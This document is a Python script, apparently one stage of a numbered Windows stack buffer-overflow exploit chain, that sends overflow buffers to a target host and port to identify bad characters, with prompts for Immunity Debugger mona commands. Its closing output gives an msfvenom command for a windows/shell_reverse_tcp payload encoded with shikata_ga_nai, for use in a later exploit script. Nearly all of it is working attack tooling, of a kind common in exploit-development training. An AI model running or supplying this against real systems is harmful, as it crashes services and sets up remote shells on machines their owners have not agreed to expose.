#!/usr/bin/env python3

from utils import * 
import sys
import os

BAD_CHARS = []

def gen_chars() :
    global BAD_CHARS

    chars   = "".join( chr(x) for x in range(256) if x not in BAD_CHARS )
    return chars

def find_badchars(eip_off, bof_val) :
    global BAD_CHARS

    done = False
    while not done :
        print("\n[*] Actual list of bad chars: {}".format([hex(x) for x in BAD_CHARS]))
        answer = input("[!] Any new bad chars ? (yes/no): ").strip()
        if not get_answer(answer) :
            done = True
        else :
            char = -1
            while char < 0 or char > 255 :
                char = int( input("Enter the hex value of the bad char (00-ff): ").strip(), 16 )
                    
            if char not in BAD_CHARS: BAD_CHARS.append(char)
            possible_chars = gen_chars()

            buffer = "A" * eip_off + possible_chars + "C" * (bof_val - eip_off - len(possible_chars))
            connect_send(target, port, buffer)

            print("[!] Execute the following commands in Immunity Debugger:")
            print("[*] !mona bytearray -cpb '{}'".format(''.join('\\x{:02x}'.format(x) for x in BAD_CHARS)))
            print("""[*] !mona compare -f "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\\bytearray.bin" -a ADDRESS""")
            print("[*] ADDRESS:\n1- follow in dump the register that holds your buffer (sent data)\n2- find the address of the characters 00-FF !")

            input("\n\n[!] Restart the crashed app !\nPress anykey...")
            os.system("clear")
    
    return 

if __name__ == "__main__" :

    if len(sys.argv) != 5 :
        print("[!] Usage: {} 'target' 'port' 'overflow value' 'eip offset'".format(sys.argv[0]))
        sys.exit(1)

    target  = sys.argv[1]
    port    = int(sys.argv[2])
    bof_val = int(sys.argv[3])
    eip_off = int(sys.argv[4])

    find_badchars(eip_off, bof_val)
    print("\n\n[*] The bad chars are: '{}'".format(''.join('\\x{:02x}'.format(x) for x in BAD_CHARS)))
    print("""Next step edit:
    1- run 4-jmp_esp.py
    2- msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -a x86 --platform windows -b "{}" -e x86/shikata_ga_nai -f c
    3- edit 5-exploit.py""".format(''.join('\\x{:02x}'.format(x) for x in BAD_CHARS)))